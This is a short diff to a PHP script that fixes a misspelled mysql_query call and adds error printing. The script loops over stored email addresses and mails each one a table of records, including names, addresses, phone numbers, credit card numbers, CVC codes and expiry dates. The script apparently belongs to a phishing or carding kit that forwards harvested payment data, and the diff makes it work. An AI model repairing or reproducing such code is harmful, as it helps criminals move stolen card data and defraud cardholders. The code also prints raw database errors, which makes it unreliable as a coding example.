@@ -65,7 +65,8 @@ print mysql_error();
 $emailTable = mysql_query($email_retreival);
 while ($emailRow = mysql_fetch_array($emailTable))
 {
-	$dataTable = mysqlquery($data_retreival);
+	$dataTable = mysql_query($data_retreival);
+	print mysql_error();
 	$to = $emailRow["email"];
 	$message = "UPDATE \n";
 	$message.= "email \t| first \t| last \t| birth \t| city \t| zipcode \t| country \t| phone \t| creditcard \t| cvc \t| expiration \t| street  \t \n";
@@ -90,6 +91,7 @@ while ($emailRow = mysql_fetch_array($emailTable))
 		}
 		mail($to, $subject, $message);
 }
+print mysql_error();
 
 ?>
 </html>
